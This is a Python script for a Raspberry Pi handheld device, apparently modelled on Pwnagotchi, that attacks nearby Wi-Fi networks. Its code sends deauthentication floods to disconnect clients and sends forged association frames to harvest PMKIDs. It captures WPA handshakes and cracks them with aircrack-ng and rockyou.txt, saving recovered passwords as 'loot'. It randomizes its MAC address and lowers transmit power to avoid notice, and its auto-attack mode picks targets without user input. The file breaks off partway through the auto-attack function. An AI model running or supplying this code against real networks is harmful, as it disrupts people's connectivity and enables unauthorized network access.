#!/usr/bin/env python3
"""
KTOx Payload – KTOxGOTCHI 
========================================================
Author: wickednull

- Full 4-way handshake capture + PMKID + half‑handshake
- Auto‑attack mode (continuous) or manual target selection
- Integrated cracking (aircrack-ng with rockyou.txt)
- Cute faces with blinking
- Channel hopping with client prioritisation
- Deauth backoff, whitelist, stealth mode
- Log viewer, lifetime stats
- Settings menu (KEY2): manual cracking, stealth, deauth, auto-attack, whitelist, reset stats

Controls:
  OK         Start / Pause capture / select in menu
  UP/DOWN    Scroll targets (manual mode) / stats views / menu items
  LEFT/RIGHT Toggle deauth ON/OFF (quick toggle)
  KEY1       Cycle views: face > stats > captures
  KEY2       Open settings menu
  KEY3       Exit

Loot: /root/KTOx/loot/Pwnagotchi/
Dependencies: scapy, aircrack-ng, RPi.GPIO, LCD_1in44, PIL
"""

import os
import sys
import time
import json
import threading
import subprocess
import random
import re
from datetime import datetime
from collections import deque

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()
f9 = font(9)
f11 = font(11)
f14 = font(14)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Paths & config
# ----------------------------------------------------------------------
LOOT_DIR = "/root/KTOx/loot/Pwnagotchi"
STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")
CRACKED_DIR = os.path.join(LOOT_DIR, "cracked")
os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(HANDSHAKE_DIR, exist_ok=True)
os.makedirs(CRACKED_DIR, exist_ok=True)

WORDLIST = "/usr/share/wordlists/rockyou.txt"
if not os.path.exists(WORDLIST):
    WORDLIST = "/usr/share/john/password.lst"

# ----------------------------------------------------------------------
# Scapy
# ----------------------------------------------------------------------
try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ----------------------------------------------------------------------
# Constants
# ----------------------------------------------------------------------
CHANNELS_24_PRIORITY = [1, 6, 11]
CHANNELS_24_ALL = list(range(1, 14))
CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64]
DWELL_PRIORITY = 3
DWELL_OTHER = 1
DWELL_5GHZ = 2
DWELL_DEAUTH = 8
DEAUTH_BURST_ROUNDS = 7
HALF_HS_MIN = 2
MAX_DEAUTH_APS = 5
MAX_DEAUTH_CLIENTS = 10
MIN_DEAUTH_SIGNAL = -85
MAX_DEAUTHS_PER_BSSID = 10
AP_TTL = 120
STA_TTL = 300
EAPOL_TTL = 30
MAX_BEACON_CACHE = 200
MAX_PEERS = 50

# ----------------------------------------------------------------------
# Global state
# ----------------------------------------------------------------------
shutdown = threading.Event()
capture_event = threading.Event()
lock = threading.Lock()

deauth_enabled = True
stealth_enabled = False
auto_attack = False          # auto mode (continuous)
current_channel = 1
mood = "normal"
start_time = time.time()
capture_flash = 0

session_aps = {}
session_clients = {}
session_handshakes = 0
session_half_hs = 0
session_pmkid = 0
session_deauths = 0
captured_bssids = set()
eapol_buffer = {}
beacon_cache = {}
last_capture_ssid = ""

channel_activity = {ch: 0 for ch in range(1, 14)}
activity_history = deque([0] * 20, maxlen=20)
peers_detected = set()

lifetime_handshakes = 0
lifetime_half_hs = 0
lifetime_pmkid = 0
lifetime_networks = 0
cracked_count = 0

whitelist_macs = set()
whitelist_ssids = set()

mon_iface = None
original_mac = ""

view = "face"
scroll = 0
networks = []           # list of dicts for manual selection
selected_idx = 0
auto_attack_thread = None
auto_attack_stop = threading.Event()

# Settings menu items
settings_options = [
    "Crack Handshakes",
    "Stealth Mode",
    "Deauth",
    "Auto Attack",
    "Whitelist",
    "Reset Stats"
]
settings_idx = 0

# Cute faces (original KTOxGOTCHI style)
faces = {
    "normal":    "(◕‿‿◕)",
    "blink":     "(-‿‿-)",
    "happy":     "(≧◡≦)",
    "excited":   "(☼‿‿☼)",
    "cracked":   "(★‿★)",
    "cracking":  "(⊙_⊙)",
    "attacking":  "(⌐■_■)",
    "deauthing": "(◣_◢)",
    "pmkid":     "(ᗒᗨᗕ)",
    "half":      "(◕∇◕)",
    "assoc":     "(°▃▃°)",
    "lost":      "(X\\/X)",
    "missed":    "(☼/\\☼)",
    "searching": "(ಠ_↼ )",
    "scanning":  "(ó_ò )",
    "waiting":   "(·_·  )",
    "stealth":   "(#‿‿#)",
    "sleeping":  "(－_－)",
}
mood_timer = None

_MOOD_DURATIONS = {
    # mood: seconds before returning to "normal" (0 = stays until changed)
    "happy":     5.0,
    "excited":   4.0,
    "cracked":   6.0,
    "cracking":  0,      # stays until cracking completes
    "attacking":  2.5,
    "deauthing": 3.0,
    "pmkid":     5.0,
    "half":      4.0,
    "assoc":     3.0,
    "lost":      3.0,
    "missed":    2.0,
    "searching": 2.5,
    "scanning":  0,      # stays until channel hopper resets it
    "waiting":   0,
}

def set_mood(new_mood):
    global mood, mood_timer
    mood = new_mood
    if mood_timer:
        mood_timer.cancel()
        mood_timer = None
    dur = _MOOD_DURATIONS.get(new_mood)
    if dur:
        mood_timer = threading.Timer(dur, lambda: set_mood("normal"))
        mood_timer.start()

# ----------------------------------------------------------------------
# Config & stats
# ----------------------------------------------------------------------
def load_stats():
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks, cracked_count
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                d = json.load(f)
            lifetime_handshakes = d.get("handshakes", 0)
            lifetime_half_hs = d.get("half_hs", 0)
            lifetime_pmkid = d.get("pmkid", 0)
            lifetime_networks = d.get("networks", 0)
            cracked_count = d.get("cracked", 0)
        except: pass

def save_stats():
    try:
        with open(STATS_FILE, "w") as f:
            json.dump({
                "handshakes": lifetime_handshakes,
                "half_hs": lifetime_half_hs,
                "pmkid": lifetime_pmkid,
                "networks": lifetime_networks,
                "cracked": cracked_count,
                "last_session": datetime.now().isoformat(),
            }, f, indent=2)
    except: pass

def load_config():
    global whitelist_macs, whitelist_ssids, deauth_enabled, stealth_enabled, auto_attack
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
            whitelist_macs = set(d.get("whitelist_macs", []))
            whitelist_ssids = set(d.get("whitelist_ssids", []))
            deauth_enabled = d.get("deauth_enabled", True)
            stealth_enabled = d.get("stealth_enabled", False)
            auto_attack = d.get("auto_attack", False)
        except: pass

def save_config():
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "whitelist_macs": sorted(whitelist_macs),
            "whitelist_ssids": sorted(whitelist_ssids),
            "deauth_enabled": deauth_enabled,
            "stealth_enabled": stealth_enabled,
            "auto_attack": auto_attack,
        }, f, indent=2)

# ----------------------------------------------------------------------
# Interface & monitor mode
# ----------------------------------------------------------------------
def get_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except: return ""

def randomize_mac(iface):
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)

def restore_mac(iface, mac):
    if not mac: return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)

def reduce_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "500"], capture_output=True)

def restore_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "auto"], capture_output=True)

def monitor_up(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["sudo", "iw", iface, "set", "monitor", "none"], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
    time.sleep(0.5)
    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True)
    if "type monitor" in r.stdout:
        return iface
    subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True)
    mon = f"{iface}mon"
    if os.path.exists(f"/sys/class/net/{mon}"):
        return mon
    return iface

def monitor_down(iface):
    if not iface: return
    base = iface[:-3] if iface.endswith("mon") else iface
    subprocess.run(["sudo", "airmon-ng", "stop", iface], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", base, "down"], capture_output=True)
    subprocess.run(["sudo", "iw", base, "set", "type", "managed"], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", base, "up"], capture_output=True)

def get_available_wifi():
    interfaces = []
    for name in os.listdir("/sys/class/net"):
        if name.startswith("wlan") and os.path.exists(f"/sys/class/net/{name}/wireless"):
            interfaces.append(name)
    return interfaces

def select_interface():
    ifaces = get_available_wifi()
    if not ifaces:
        return None
    # Prefer wlan1 (USB dongle) over wlan0 (onboard)
    if "wlan1" in ifaces:
        return "wlan1"
    return ifaces[0]

# ----------------------------------------------------------------------
# Cracking helper (manual)
# ----------------------------------------------------------------------
def manual_crack():
    """List captured handshakes, let user select one, crack it."""
    caps = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".cap")]
    if not caps:
        # Show "No handshakes" message
        img = Image.new("RGB", (W, H), "#0A0000")
        d = ImageDraw.Draw(img)
        d.text((4, 50), "No handshakes found", font=f9, fill=(171, 178, 185))
        d.text((4, 70), "Press any key", font=f9, fill=(113, 125, 126))
        LCD.LCD_ShowImage(img, 0, 0)
        wait_btn(2)
        return
    idx = 0
    while True:
        # Draw list
        img = Image.new("RGB", (W, H), "#0A0000")
        d = ImageDraw.Draw(img)
        d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
        d.text((4, 3), "SELECT CAPTURE", font=f9, fill=(231, 76, 60))
        visible = caps[idx:idx+6]
        y = 20
        for fname in visible:
            d.text((4, y), fname[:20], font=f9, fill=(171, 178, 185))
            y += 12
        d.text((4, H-30), f"{len(caps)} total", font=f9, fill=(171, 178, 185))
        d.text((4, H-10), "U/D OK K3=Back", font=f9, fill=(192, 57, 43))
        LCD.LCD_ShowImage(img, 0, 0)
        btn = wait_btn(0.2)
        if btn == "UP":
            idx = max(0, idx-1)
        elif btn == "DOWN":
            idx = min(len(caps)-1, idx+1)
        elif btn == "OK":
            cap_file = os.path.join(HANDSHAKE_DIR, caps[idx])
            # Run aircrack-ng
            set_mood("searching")
            # Show cracking message
            img2 = Image.new("RGB", (W, H), "#0A0000")
            d2 = ImageDraw.Draw(img2)
            d2.text((4, 50), f"Cracking {caps[idx][:12]}...", font=f9, fill=(212, 172, 13))
            d2.text((4, 70), "Please wait", font=f9, fill=(113, 125, 126))
            LCD.LCD_ShowImage(img2, 0, 0)
            result = subprocess.run(f"aircrack-ng -w {WORDLIST} {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True)
            m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
            if m:
                password = m.group(1)
                # Save cracked password
                safe = os.path.basename(cap_file).replace(".cap", "")
                cracked_file = os.path.join(CRACKED_DIR, f"{safe}_cracked.txt")
                with open(cracked_file, "w") as f:
                    f.write(f"File: {cap_file}\nPassword: {password}\nDate: {datetime.now().isoformat()}\n")
                # Update global cracked count
                global cracked_count
                cracked_count += 1
                save_stats()
                set_mood("cracked")
                # Show password
                img3 = Image.new("RGB", (W, H), "#0A0000")
                d3 = ImageDraw.Draw(img3)
                d3.text((4, 40), f"Password found!", font=f9, fill=(30, 132, 73))
                d3.text((4, 55), f"{password[:20]}", font=f9, fill=(171, 178, 185))
                d3.text((4, H-20), "Press any key", font=f9, fill=(113, 125, 126))
                LCD.LCD_ShowImage(img3, 0, 0)
                wait_btn(2)
            else:
                set_mood("lost")
                img3 = Image.new("RGB", (W, H), "#0A0000")
                d3 = ImageDraw.Draw(img3)
                d3.text((4, 50), "No password found", font=f9, fill=(231, 76, 60))
                d3.text((4, 70), "Try better wordlist", font=f9, fill=(113, 125, 126))
                d3.text((4, H-20), "Press any key", font=f9, fill=(113, 125, 126))
                LCD.LCD_ShowImage(img3, 0, 0)
                wait_btn(2)
            break
        elif btn == "KEY3":
            break
        time.sleep(0.05)

def show_whitelist():
    """Simple display of whitelisted MACs and SSIDs."""
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4, 3), "WHITELIST", font=f9, fill=(231, 76, 60))
    y = 20
    d.text((4, y), f"MACs: {len(whitelist_macs)}", font=f9, fill=(171, 178, 185)); y+=12
    for mac in list(whitelist_macs)[:5]:
        d.text((6, y), mac[:17], font=f9, fill=(171, 178, 185)); y+=10
    if len(whitelist_macs) > 5:
        d.text((6, y), "...", font=f9, fill=(171, 178, 185)); y+=10
    y += 5
    d.text((4, y), f"SSIDs: {len(whitelist_ssids)}", font=f9, fill=(171, 178, 185)); y+=12
    for ssid in list(whitelist_ssids)[:5]:
        d.text((6, y), ssid[:15], font=f9, fill=(171, 178, 185)); y+=10
    d.rectangle((0, H-12, W, H), fill=(34, 0, 0))
    d.text((4, H-10), "Edit config file", font=f9, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)
    wait_btn(3)

def reset_stats():
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks, cracked_count
    # Confirm
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.text((4, 50), "Reset lifetime stats?", font=f9, fill=(231, 76, 60))
    d.text((4, 70), "OK to confirm, K3 cancel", font=f9, fill=(113, 125, 126))
    LCD.LCD_ShowImage(img, 0, 0)
    btn = wait_btn(2)
    if btn == "OK":
        lifetime_handshakes = 0
        lifetime_half_hs = 0
        lifetime_pmkid = 0
        lifetime_networks = 0
        cracked_count = 0
        save_stats()
        set_mood("happy")
        # Show done
        img2 = Image.new("RGB", (W, H), "#0A0000")
        d2 = ImageDraw.Draw(img2)
        d2.text((4, 50), "Stats reset", font=f9, fill=(30, 132, 73))
        LCD.LCD_ShowImage(img2, 0, 0)
        wait_btn(1)

# ----------------------------------------------------------------------
# Packet handler (handshake + PMKID)
# ----------------------------------------------------------------------
def save_capture(bssid, essid, pkts, ctype):
    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"{ctype}_{safe}_{ts}.pcap"
    full = os.path.join(HANDSHAKE_DIR, fname)
    bcn = beacon_cache.get(bssid)
    save_pkts = [bcn] if bcn else []
    save_pkts.extend(pkts)
    wrpcap(full, save_pkts)
    # Auto-crack (optional, but we keep for automatic mode)
    # In manual mode we don't auto-crack, but we can still auto-crack if desired.
    # We'll keep auto-crack only if auto_attack is on? Or always?
    # For now, we'll keep auto-crack because it's a separate feature.
    if auto_attack:
        password = try_crack(full, essid, bssid)
        if password:
            print(f"[CRACKED] {essid} -> {password}")
    return fname

def try_crack(cap_path, essid, bssid):
    global cracked_count
    if not os.path.exists(WORDLIST):
        return None
    set_mood("cracking")
    result = subprocess.run(f"aircrack-ng -w {WORDLIST} {cap_path} 2>/dev/null", shell=True, capture_output=True, text=True)
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
    if m:
        password = m.group(1)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
        cracked_file = os.path.join(CRACKED_DIR, f"{safe}_{bssid}_{ts}.txt")
        with open(cracked_file, "w") as f:
            f.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
        cracked_count += 1
        save_stats()
        set_mood("cracked")
        return password
    set_mood("lost")
    return None

def packet_handler(pkt):
    global session_handshakes, session_half_hs, session_pmkid, lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
    global last_capture_ssid, capture_flash

    if shutdown.is_set() or not capture_event.is_set():
        return
    if not pkt.haslayer(Dot11):
        return
    if pkt[Dot11].type == 1:  # control frames
        return

    # Beacons
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except:
            essid = ""
        if not essid:
            essid = "<hidden>"
        if bssid in whitelist_macs or essid in whitelist_ssids:
            return
        sig = getattr(pkt, "dBm_AntSignal", -99)
        with lock:
            if bssid not in beacon_cache:
                beacon_cache[bssid] = pkt
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "channel": current_channel,
                    "signal": sig, "clients": set(), "last_seen": time.time(),
                }
            else:
                session_aps[bssid]["signal"] = sig
                session_aps[bssid]["last_seen"] = time.time()
            channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1

    # Clients (data frames)
    if pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = {"bssid": bss, "last_seen": time.time()}
                channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1

    # EAPOL handshake / PMKID
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))
        with lock:
            if pair not in eapol_buffer:
                eapol_buffer[pair] = []
            eapol_buffer[pair].append(pkt)
            msg_count = len(eapol_buffer[pair])
            bssid = None
            for mac in pair:
                if mac in session_aps:
                    bssid = mac
                    break
            if not bssid:
                return

            # PMKID extraction from M1
            if bssid == src and bssid not in captured_bssids:
                try:
                    eapol_raw = bytes(pkt[EAPOL])
                    if len(eapol_raw) > 99:
                        key_info = int.from_bytes(eapol_raw[5:7], "big")
                        is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)
                        if is_m1:
                            data_len = int.from_bytes(eapol_raw[97:99], "big")
                            key_data = eapol_raw[99:99+data_len]
                            i = 0
                            while i+6 < len(key_data):
                                kde_type = key_data[i]
                                kde_len = key_data[i+1]
                                if kde_type == 0xdd and kde_len >= 20:
                                    oui = key_data[i+2:i+5]
                                    data_type = key_data[i+5]
                                    if oui == b'\x00\x0f\xac' and data_type == 4:
                                        pmkid = key_data[i+6:i+22]
                                        if pmkid != b'\x00'*16:
                                            captured_bssids.add(bssid)
                                            session_pmkid += 1
                                            lifetime_pmkid += 1
                                            lifetime_networks += 1
                                            essid = session_aps.get(bssid, {}).get("essid", "unknown")
                                            last_capture_ssid = essid
                                            capture_flash = 30
                                            fname = save_capture(bssid, essid, [pkt], "pmkid")
                                            set_mood("pmkid")
                                        break
                                i += (2 + kde_len) if kde_len > 0 else 2
                except: pass

            # Full handshake (4 messages)
            if bssid not in captured_bssids and msg_count >= 4:
                captured_bssids.add(bssid)
                session_handshakes += 1
                lifetime_handshakes += 1
                lifetime_networks += 1
                essid = session_aps.get(bssid, {}).get("essid", "unknown")
                last_capture_ssid = essid
                capture_flash = 30
                pkts = list(eapol_buffer[pair])
                eapol_buffer[pair] = []
                fname = save_capture(bssid, essid, pkts, "hs4")
                set_mood("happy")

            # Limit buffer
            if len(eapol_buffer[pair]) > 8:
                eapol_buffer[pair] = eapol_buffer[pair][-4:]

# ----------------------------------------------------------------------
# Half-handshake checker
# ----------------------------------------------------------------------
def half_hs_checker():
    while not shutdown.is_set() and capture_event.is_set():
        if shutdown.wait(timeout=10):
            break
        if not capture_event.is_set():
            break
        with lock:
            now = time.time()
            stale = []
            for pair, pkts in eapol_buffer.items():
                if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
                    try:
                        if now - pkts[0].time > 15:
                            stale.append(pair)
                    except:
                        stale.append(pair)
            for pair in stale:
                pkts = eapol_buffer.pop(pair, [])
                if len(pkts) < HALF_HS_MIN:
                    continue
                bssid = None
                for mac in pair:
                    if mac in session_aps:
                        bssid = mac
                        break
                if bssid and bssid not in captured_bssids:
                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
                    captured_bssids.add(bssid)
                    session_half_hs += 1
                    lifetime_half_hs += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    capture_flash = 20
                    save_capture(bssid, essid, pkts, "hs_half")
                    set_mood("half")
        time.sleep(2)

# ----------------------------------------------------------------------
# Deauth helpers
# ----------------------------------------------------------------------
deauth_backoff = {}

def should_deauth(bssid):
    info = deauth_backoff.get(bssid)
    if not info: return True
    if info["count"] >= MAX_DEAUTHS_PER_BSSID: return False
    if time.time() < info["skip_until"]: return False
    return True

def record_deauth(bssid):
    if bssid not in deauth_backoff:
        deauth_backoff[bssid] = {"count": 0, "skip_until": 0}
    info = deauth_backoff[bssid]
    info["count"] += 1
    if info["count"] >= 6:
        info["skip_until"] = time.time() + 150
    elif info["count"] >= 3:
        info["skip_until"] = time.time() + 60

def send_deauth_burst(bssid, clients, iface):
    reasons = [7,1,4]
    pkts = []
    for reason in reasons:
        pkts.append(RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
    for client in clients[:MAX_DEAUTH_CLIENTS]:
        for reason in reasons:
            pkts.append(RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
            pkts.append(RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
    set_mood("deauthing")
    for _ in range(DEAUTH_BURST_ROUNDS):
        sendp(pkts, iface=iface, count=1, inter=0, verbose=False)

def active_pmkid_probe(bssid, essid, iface):
    if bssid in captured_bssids or bssid in whitelist_macs or essid in whitelist_ssids:
        return
    if not essid or essid == "<hidden>":
        return
    our_mac = get_mac(iface) or "02:00:00:00:00:01"
    try:
        auth = RadioTap() / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid, type=0, subtype=11) / Dot11Auth(algo=0, seqnum=1, status=0)
        sendp(auth, iface=iface, count=1, verbose=False)
        time.sleep(0.1)
        rsn_ie = bytes([0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00])
        assoc = RadioTap() / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid, type=0, subtype=0) / Dot11AssoReq(cap=0x1104, listen_interval=3) / Dot11Elt(ID=0, info=essid.encode()) / Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96') / Dot11Elt(ID=48, info=rsn_ie)
        sendp(assoc, iface=iface, count=1, verbose=False)
    except: pass

# ----------------------------------------------------------------------
# Channel hopping & scanning
# ----------------------------------------------------------------------
def set_channel(ch):
    global current_channel
    subprocess.run(["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)], capture_output=True)
    current_channel = ch

def dwell(seconds):
    return not shutdown.wait(seconds) and capture_event.is_set()

def scan_networks_quick(timeout=5):
    """Quick scan to update AP list for manual mode."""
    global networks
    tmp = "/tmp/ktoxgotchi_scan"
    subprocess.run(f"rm -f {tmp}*", shell=True)
    subprocess.run(
        f"timeout {timeout} airodump-ng --output-format csv -w {tmp} {mon_iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)
    nets = []
    csv_file = f"{tmp}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            content = f.read()
        if "Station MAC" in content:
            content = content.split("Station MAC")[0]
        lines = content.strip().split("\n")
        header_idx = -1
        for i, line in enumerate(lines):
            if "BSSID" in line and "ESSID" in line:
                header_idx = i
                break
        if header_idx >= 0:
            headers = [h.strip() for h in lines[header_idx].split(",")]
            try:
                col_bssid = headers.index("BSSID")
                col_ch = headers.index("channel")
                col_essid = headers.index("ESSID")
            except:
                return
            for line in lines[header_idx+1:]:
                if not line.strip():
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) <= max(col_bssid, col_ch, col_essid):
                    continue
                bssid = parts[col_bssid]
                if not re.match(r"([0-9A-Fa-f]{2}:){5}", bssid):
                    continue
                essid = parts[col_essid]
                if essid and essid != "(not associated)":
                    ch = parts[col_ch]
                    nets.append({
                        "bssid": bssid,
                        "essid": essid,
                        "channel": ch
                    })
    networks = nets

def channel_hopper():
    """Main capture loop: channel hopping + deauth + PMKID probes."""
    checked_5g = set()
    supported_5g = set()
    while not shutdown.is_set() and capture_event.is_set():
        # Scan hot channels first (APs with clients, uncaptured)
        hot = {}
        with lock:
            ap_count = len(session_aps)
            for bssid, info in session_aps.items():
                ch = info.get("channel")
                if not ch: continue
                cli = len(info.get("clients", set()))
                uncap = (bssid not in captured_bssids and
                         bssid not in whitelist_macs and
                         info.get("essid") not in whitelist_ssids)
                hot[ch] = hot.get(ch, (0, False))
                hot[ch] = (hot[ch][0] + cli, hot[ch][1] or uncap)
        hot_list = [(ch, cli) for ch, (cli, uncap) in hot.items() if uncap and cli > 0]
        hot_list.sort(key=lambda x: x[1], reverse=True)
        if mood not in ("deauthing", "attacking", "assoc", "happy", "pmkid", "half", "cracking", "cracked"):
            set_mood("scanning" if ap_count == 0 else "normal")
        visited = set()
        for ch, _ in hot_list:
            if not capture_event.is_set():
                return
            set_channel(ch)
            visited.add(ch)
            # Deauth on this channel
            deauthed = 0
            if deauth_enabled:
                with lock:
                    targets = [(b, info) for b, info in session_aps.items()
                               if info.get("channel") == ch and b not in captured_bssids
                               and b not in whitelist_macs
                               and info.get("essid") not in whitelist_ssids
                               and should_deauth(b)]
                for bssid, info in targets[:MAX_DEAUTH_APS]:
                    clients = list(info.get("clients", set()))
                    if clients:
                        send_deauth_burst(bssid, clients, mon_iface)
                        record_deauth(bssid)
                        deauthed += 1
                        with lock:
                            session_deauths += 1
                    # PMKID probe for clientless APs
                    if not clients and info.get("essid"):
                        active_pmkid_probe(bssid, info["essid"], mon_iface)
            dwell(DWELL_DEAUTH if deauthed > 0 else DWELL_PRIORITY)

        # Other 2.4GHz channels
        for ch in CHANNELS_24_ALL:
            if ch in visited:
                continue
            if not capture_event.is_set():
                return
            set_channel(ch)
            dwell(DWELL_OTHER)

        # 5GHz channels
        for ch in CHANNELS_5:
            if not capture_event.is_set():
                return
            if ch in checked_5g and ch not in supported_5g:
                continue
            set_channel(ch)
            checked_5g.add(ch)
            if subprocess.run(["iw", "dev", mon_iface, "info"], capture_output=True).returncode == 0:
                supported_5g.add(ch)
            dwell(DWELL_5GHZ)

        if stealth_enabled:
            randomize_mac(mon_iface)

# ----------------------------------------------------------------------
# Sniffer thread
# ----------------------------------------------------------------------
def sniffer_thread():
    if not SCAPY_OK or not mon_iface:
        return
    try:
        conf.bufsize = 4*1024*1024
    except: pass
    scapy_sniff(iface=mon_iface, prn=packet_handler,
                stop_filter=lambda _: shutdown.is_set() or not capture_event.is_set(),
                store=0)

# ----------------------------------------------------------------------
# Auto-attack worker (continuous)
# ----------------------------------------------------------------------
def auto_attack_worker():
    while auto_attack and not auto_attack_stop.is_set() and capture_event.is_set():
        try:
            # Scan for networks
            scan_networks_quick(8)
            if not networks:
                time.sleep(5)
                continue
            # Find AP with clients
            attacked = False
            for net in networks:
                if not capture_event.is_set() or auto_attack_stop.is_set():
                    break
                bssid = net["bssid"]
                essid = net["essid"]
                ch = int(net["channel"])
                # Get clients on this AP
                tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
                subprocess.run(f"rm -f {tmp}*", shell=True)
                subprocess.run(
                    f"timeout 5 airodump-ng -c {ch} --bssid {bssid} -w {tmp} {mon_iface}",
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                time.sleep(1)
                clients = []
                csv_file = f"{tmp}-01.csv"
                if os.path.exists(csv_file):
                    with open(csv_file, errors="ignore") as f:
                        content = f.read()
                    if "Station MAC" in content:
                        station_section = content.split("Station MAC")[1]
                        for line in station_section.strip().split("\n"):
                            parts = [p.strip() for p in line.split(",")]
                            if parts and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                                clients.append(parts[0])
                if clients:
                    set_mood("assoc")
                    # Attack
                    tmp_hs = f"/tmp/ktoxgotchi_auto_{bssid.replace(':', '_')}"
